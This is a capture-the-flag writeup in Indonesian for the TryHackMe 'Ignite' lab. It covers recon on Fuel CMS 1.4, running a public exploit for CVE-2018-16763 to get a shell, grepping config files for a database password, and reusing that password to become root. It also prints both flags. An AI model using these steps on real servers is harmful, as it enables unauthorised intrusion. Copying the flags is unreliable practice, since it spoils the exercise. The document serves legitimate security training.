# Ignite — TryHackMe Writeup

**Target:** Ignite  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Kategori:** Web, CVE, Privilege Escalation  

---

## Recon

```
80/tcp  open  http  Apache httpd 2.4.18 (Ubuntu)
```

Hanya satu port terbuka. Tidak ada SSH.

### File Menarik

```bash
curl http://TARGET/robots.txt
# Disallow: /fuel/
```

```bash
curl http://TARGET/composer.json
# "name": "codeigniter/framework"
```

```bash
curl http://TARGET/README.md
# Fuel CMS 1.4
```

Versi aplikasi: **Fuel CMS 1.4**

---

## Vulnerability Research

```
CVE-2018-16763
Remote Code Execution — Fuel CMS <= 1.4.1
```

Root cause: fungsi `create_function()` pada parameter di endpoint `/fuel` menerima input tanpa sanitasi, memungkinkan eksekusi kode PHP arbitrary.

PoC: [github.com/padsalatushal/CVE-2018-16763](https://github.com/padsalatushal/CVE-2018-16763)

---

## Eksploitasi — RCE via CVE-2018-16763

```bash
python3 exploit.py -u http://TARGET
```

Shell diperoleh sebagai `www-data`.

### User Flag

```bash
cat /home/www-data/flag.txt
# 6470e394cbf6dab6a91682cc8585059b
```

---

## Privilege Escalation — Credential di Config File

### Enumerasi

Fuel CMS menyimpan konfigurasi database di:

```
fuel/application/config/database.php
```

Pencarian credential menggunakan grep:

```bash
grep -r "password" /var/www/html/fuel/application/config/
```

Ditemukan:

```
'password' => 'mememe'
```

### Root Shell

Password database digunakan sebagai password root:

```bash
su root
# password: mememe
```

### Root Flag

```bash
cat /root/root.txt
# b9bbcb33e11b80be759c4e844862482d
```

---

## Ringkasan

| Fase           | Teknik                                        |
|----------------|-----------------------------------------------|
| Recon          | composer.json + README.md → version disclosure|
| Vulnerability  | CVE-2018-16763 — RCE via create_function()    |
| Initial Access | PoC exploit → shell sebagai www-data          |
| PrivEsc        | Password reuse — config file → su root        |
| Flag           | user + root ✅                                |

## Takeaway

Config file aplikasi web sering menyimpan credential database dalam plaintext. Setelah mendapat shell, pencarian credential di direktori config adalah langkah enumerasi yang worth dilakukan — terutama kalau `sudo -l` dan SUID tidak memberikan hasil. Password reuse antara database dan sistem operasi adalah misconfiguration yang umum ditemukan di environment production maupun CTF.

